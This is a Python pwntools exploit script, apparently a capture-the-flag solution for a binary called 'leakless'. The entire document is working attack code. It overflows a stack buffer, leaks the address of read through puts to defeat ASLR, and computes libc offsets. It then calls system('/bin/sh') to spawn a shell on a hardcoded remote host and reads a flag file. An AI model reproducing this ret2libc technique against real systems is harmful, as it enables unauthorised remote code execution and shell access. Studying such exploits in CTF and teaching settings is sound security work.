#### exploit by p4w ####
from pwn import *
import time

local = True#False#
off = 76
base_main = 0x8048000
puts_off = 0x000003f0
read_got = 0x804a00c
main = 0x080485fa
puts = base_main + puts_off
call_puts_plt = base_main + puts_off #this will be: 0x080483f0
"""
gef  disassemble 0x080483f0
Dump of assembler code for function puts@plt:
   0x080483f0 <+0>:     jmp    DWORD PTR ds:0x804a018
   0x080483f6 <+6>:     push   0x18
   0x080483fb <+11>:    jmp    0x80483b0
End of assembler dump.
"""

if local == True:
    r = process("./leakless")
    system_off = 0x0003cd10
    read_off = 0x000e5620
    bin_sh_off = 0x0017b8cf
else:
    r = remote("35.243.188.20", 2002)
    system_off = 0x03d540
    read_off = 0x0e5180
    bin_sh_off = 0x1794d1

p = ''
p += "A"*off
p += p32(call_puts_plt)
p += p32(main)
p += p32(read_got)
r.sendline(p)
leak = u32(r.recv(1024)[:4])
print "[+] leaked read at: " + hex(leak)
libc_base = leak - read_off
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off
print "[+] libc_base addr at: " + hex(libc_base)
p = ''
p += "A"*off
p += p32(system)
p += "junk"
p += p32(bin_sh)
r.sendline(p)
time.sleep(0.1)
r.sendline("ls -al;cat flag.txt")
r.interactive()
